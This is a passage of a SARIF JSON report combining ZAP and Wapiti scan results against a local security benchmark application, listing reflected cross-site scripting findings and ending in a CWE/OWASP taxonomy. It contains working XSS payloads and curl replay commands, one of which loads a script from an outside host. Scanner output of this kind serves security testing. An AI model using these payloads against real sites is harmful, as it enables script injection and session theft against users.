                  "Wapiti - <ScRiPt>alert('w1qkh6jsx7')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02483\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02483.html?BenchmarkTest02483=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02483=%3CScRiPt%3Ealert%28%27w1qkh6jsx7%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02483"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02483', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02483.html?BenchmarkTest02483=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDI0ODM9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02483', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02483.html?BenchmarkTest02483=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02483=%3CScRiPt%3Ealert%28%27w1qkh6jsx7%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:47 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w1qkh6jsx7')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02489",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02489?secure=default&productID=default&foo=foo&BenchmarkTest02489=%3CScRiPt%3Ealert%28%27w3mqdzmr3l%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w3mqdzmr3l')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w3mqdzmr3l')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02489\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02489.html\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02489=%3CScRiPt%3Ealert%28%27w3mqdzmr3l%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02489"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02489', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02489.html?BenchmarkTest02489=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyNDg5PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02489', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02489.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02489=%3CScRiPt%3Ealert%28%27w3mqdzmr3l%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:50 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('w3mqdzmr3l')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-05/BenchmarkTest02493",
                    "Wapiti - https://localhost:8444/benchmark/xss-05/BenchmarkTest02493?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02493=%3CScRiPt%3Ealert%28%27wiaj7sxeqz%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wiaj7sxeqz')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wiaj7sxeqz')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02493\" -e \"https://localhost:8444/benchmark/xss-05/BenchmarkTest02493.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02493=%3CScRiPt%3Ealert%28%27wiaj7sxeqz%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02493"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02493', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02493.html?BenchmarkTest02493=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDI0OTM9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02493', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-05/BenchmarkTest02493.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02493=%3CScRiPt%3Ealert%28%27wiaj7sxeqz%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:02 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:26:51 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wiaj7sxeqz')</sCrIpT>\"}}"
          ]
        },
        {
          "level": 2,
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "https://localhost:8444/benchmark/xss-00/BenchmarkTest00392?username=alice&password=Letm3in_&BenchmarkTest00392=%3CScript%20src%3Dhttps%3A%2F%2Fw3el8p.com%2Fwpjlikmgrzz.js%3E%3C%2FScript%3E"
                },
                "region": {
                  "startLine": null,
                  "snippet": {
                    "text": "<Script src=https://w3el8p.com/wpjlikmgrzz.js></Script>"
                  }
                }
              },
              "properties": {
                "attack": "<Script src=https://w3el8p.com/wpjlikmgrzz.js></Script>",
                "curl_command": "curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00392?username=alice&password=Letm3in_&BenchmarkTest00392=%3CScript%20src%3Dhttps%3A%2F%2Fw3el8p.com%2Fwpjlikmgrzz.js%3E%3C%2FScript%3E\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00392.html?BenchmarkTest00392=SafeText\""
              }
            }
          ],
          "message": {
            "text": "Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00392"
          },
          "ruleId": "wapiti-reflected-cross-site-scripting",
          "webRequest": {
            "protocol": "HTTP",
            "version": "1.1",
            "target": "https://localhost:8444/benchmark/xss-00/BenchmarkTest00392?username=alice&password=Letm3in_&BenchmarkTest00392=%3CScript%20src%3Dhttps%3A%2F%2Fw3el8p.com%2Fwpjlikmgrzz.js%3E%3C%2FScript%3E",
            "method": "GET",
            "headers": {
              "host": "localhost:8444",
              "connection": "keep-alive",
              "user-agent": "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0",
              "accept-language": "en-US",
              "accept-encoding": "gzip, deflate, br",
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            },
            "body": {}
          },
          "webResponse": {
            "statusCode": 200,
            "reasonPhrase": "",
            "protocol": "HTTP",
            "version": "1.1",
            "headers": {
              "content-security-policy": "frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com",
              "cache-control": "no-cache, no-store, must-revalidate",
              "strict-transport-security": "max-age=31536000;includeSubDomains",
              "x-frame-options": "DENY",
              "x-content-type-options": "nosniff",
              "x-xss-protection": "0",
              "content-type": "text/html;charset=UTF-8",
              "content-length": "55",
              "date": "Sun, 31 Aug 2025 04:21:45 GMT",
              "keep-alive": "timeout=20",
              "connection": "keep-alive"
            },
            "body": {
              "text": "<Script src=https://w3el8p.com/wpjlikmgrzz.js></ScriptZ"
            }
          },
          "properties": {
            "sources": [
              "Wapiti"
            ],
            "levels": {},
            "messages": {},
            "uris": {},
            "startLines": {},
            "snippets": {},
            "attacks": {},
            "altRuleIds": []
          }
        }
      ],
      "taxonomies": [
        {
          "downloadUri": "https://cwe.mitre.org/data/xml/cwec_v4.8.xml.zip",
          "guid": "b000a760-3e52-3565-a35c-f61369da53b7",
          "informationUri": "https://cwe.mitre.org/data/published/cwe_v4.8.pdf",
          "isComprehensive": true,
          "language": "en",
          "minimumRequiredLocalizedDataSemanticVersion": "4.8",
          "name": "CWE",
          "organization": "MITRE",
          "releaseDateUtc": "2022-06-28",
          "shortDescription": {
            "text": "The MITRE Common Weakness Enumeration"
          },
          "taxa": [
            {
              "guid": "289d0569-32e7-4f6c-a4f2-410d836db814",
              "helpUri": "https://cwe.mitre.org/data/definitions/22.html",
              "id": "22"
            },
            {
              "guid": "d6dcce40-b760-4cb7-8974-6930cce583ca",
              "helpUri": "https://cwe.mitre.org/data/definitions/352.html",
              "id": "352"
            },
            {
              "guid": "f5133005-bedb-45ea-8fa1-f15061451e93",
              "helpUri": "https://cwe.mitre.org/data/definitions/400.html",
              "id": "400"
            },
            {
              "guid": "017821bf-c83c-46c5-b7e1-92304106b636",
              "helpUri": "https://cwe.mitre.org/data/definitions/405.html",
              "id": "405"
            },
            {
              "guid": "94cb3831-16e4-4c76-b4d9-6a6224999160",
              "helpUri": "https://cwe.mitre.org/data/definitions/434.html",
              "id": "434"
            },
            {
              "guid": "9f1d3b82-9054-4110-af7b-4c9387fcfdd7",
              "helpUri": "https://cwe.mitre.org/data/definitions/521.html",
              "id": "521"
            },
            {
              "guid": "d8ef5a99-b7f3-43bd-8a58-906e8616c93b",
              "helpUri": "https://cwe.mitre.org/data/definitions/530.html",
              "id": "530"
            },
            {
              "guid": "d7dc0e21-e737-48bc-854c-caae48a39109",
              "helpUri": "https://cwe.mitre.org/data/definitions/538.html",
              "id": "538"
            },
            {
              "guid": "4c3e76e0-30b0-4abf-81e9-4834add6c9c9",
              "helpUri": "https://cwe.mitre.org/data/definitions/601.html",
              "id": "601"
            },
            {
              "guid": "3f921ab5-32ec-4633-bdef-750a12760f72",
              "helpUri": "https://cwe.mitre.org/data/definitions/78.html",
              "id": "78"
            },
            {
              "guid": "5dd429c8-e5e3-37a8-bf40-f7b2d72a9085",
              "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
              "id": "79"
            },
            {
              "guid": "63417923-22c1-45c9-840e-106a6701212d",
              "helpUri": "https://cwe.mitre.org/data/definitions/798.html",
              "id": "798"
            },
            {
              "guid": "1f9b1ea8-6d26-43a1-82d9-6231109c036a",
              "helpUri": "https://cwe.mitre.org/data/definitions/89.html",
              "id": "89"
            },
            {
              "guid": "493f3869-d837-44a0-83d0-002340a46a94",
              "helpUri": "https://cwe.mitre.org/data/definitions/90.html",
              "id": "90"
            },
            {
              "guid": "3a74138a-fe4d-475b-8b51-f05ac2dc8f98",
              "helpUri": "https://cwe.mitre.org/data/definitions/918.html",
              "id": "918"
            },
            {
              "guid": "c5eee7ec-65b1-4349-8d2a-a92b76134bfe",
              "helpUri": "https://cwe.mitre.org/data/definitions/93.html",
              "id": "93"
            }
          ],
          "version": "4.8"
        },
        {
          "downloadUri": "https://owasp.org/www-project-web-security-testing-guide/stable/",
          "guid": "0e3ab251-0baa-4ced-bfc1-287d6cbff921",
          "informationUri": "https://owasp.org/www-project-web-security-testing-guide/",
          "isComprehensive": false,
          "language": "en",
          "name": "OWASP WSTG",
          "organization": "OWASP",
          "shortDescription": {
            "text": "The OWASP Web Security Testing Guide (WSTG)."
          },
          "taxa": [
            {
              "guid": "5b2574f1-9f5f-4d6c-b457-88830bc5c7d8",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.html",
              "id": "OSHP-Content-Security-Policy"
            },
            {
              "guid": "b91b49e0-ba2c-49de-8f9a-a568272028b4",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.html",
              "id": "OSHP-HTTP-Strict-Transport-Security"
            },
            {
              "guid": "70e6a125-2ac8-4700-9028-1625d577dfee",
              "helpUri": "https://owasp.org/www-community/attacks/MIME_sniffing.html",
              "id": "OSHP-X-Content-Type-Options"
            },
            {
              "guid": "c8de6e59-9d10-444c-bacc-e2a942ccb7f6",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html",
              "id": "OSHP-X-Frame-Options"
            },
            {
              "guid": "67e146fb-eae6-40cf-8a4c-86142de3d782",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy.html",
              "id": "WSTG-ATHN-07"
            },
            {
              "guid": "11427cc2-fb35-40ee-96cb-be051ff8b775",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.html",
              "id": "WSTG-ATHZ-01"
            },
            {
              "guid": "5a606184-d9c5-4cfe-ba36-5d9e74f823cc",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.html",
              "id": "WSTG-BUSL-08"
            },
            {
              "guid": "f3b058e1-872f-460b-9bd4-3d0d9119f917",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client_Side_Testing/03-Testing_for_HTML_Injection.html",
              "id": "WSTG-CLNT-03"
            },
            {
              "guid": "df847405-85f7-4d99-839c-73e8e3963569",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.html",
              "id": "WSTG-CLNT-04"
            },
            {
              "guid": "3c8d3187-5620-40e5-9faf-df15deab23d0",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.html",
              "id": "WSTG-CONF-01"
            },
            {
              "guid": "40f7a94d-67e8-419d-ada1-543f9d0361ca",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.html",
              "id": "WSTG-CONF-04"
            },
            {
              "guid": "bb8effac-4d38-49c9-b500-052abe4fb97c",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.html",
              "id": "WSTG-CONF-06"
            },
            {
              "guid": "815669e3-dbbf-4102-a977-777b16fb9283",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.html",
              "id": "WSTG-CONF-07"
            },
            {
              "guid": "195c243f-e08a-4668-94c1-16346e7073a8",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.html",
              "id": "WSTG-CONF-10"
            },
            {
              "guid": "e9c5cdf7-a214-4a34-81b8-0399c2b03541",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.html",
              "id": "WSTG-CONF-12"
            },
            {
              "guid": "fe14eb3a-fc1e-403e-852f-6bf5ac4e831c",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection.html",
              "id": "WSTG-CRYP-01"
            },
            {
              "guid": "a559d6a5-12a8-4769-a16b-804df2e0c3f4",
